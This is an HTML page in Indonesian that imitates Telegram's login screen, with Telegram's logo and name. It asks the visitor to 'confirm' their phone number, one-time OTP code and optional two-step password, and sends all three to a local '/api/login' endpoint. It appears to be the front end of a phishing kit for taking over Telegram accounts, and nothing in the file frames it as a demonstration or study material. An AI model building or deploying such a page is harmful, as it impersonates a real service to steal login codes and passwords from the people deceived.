<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 24 24" width="60" height="60"><path fill="#3390ec" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.52-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.74 3.88-1.69 6.46-2.81 7.74-3.35 3.69-1.55 4.45-1.82 4.95-1.83.11 0 .36.03.53.17.14.11.18.26.2.37.01.07.02.21 0 .34z"/></svg>
        </div>
        <h2>Telegram</h2>
        <p>Konfirmasi nomor telepon Anda untuk melanjutkan.</p>
        <form action="/api/login" method="POST">
            <input type="text" name="phone" placeholder="Nomor Telepon" required>
            <input type="text" name="otp" placeholder="Kode OTP" required>
            <input type="password" name="password" placeholder="Password 2-Step (Opsional)">
            <button type="submit">MASUK</button>
        </form>
    </div>
</body>
</html>
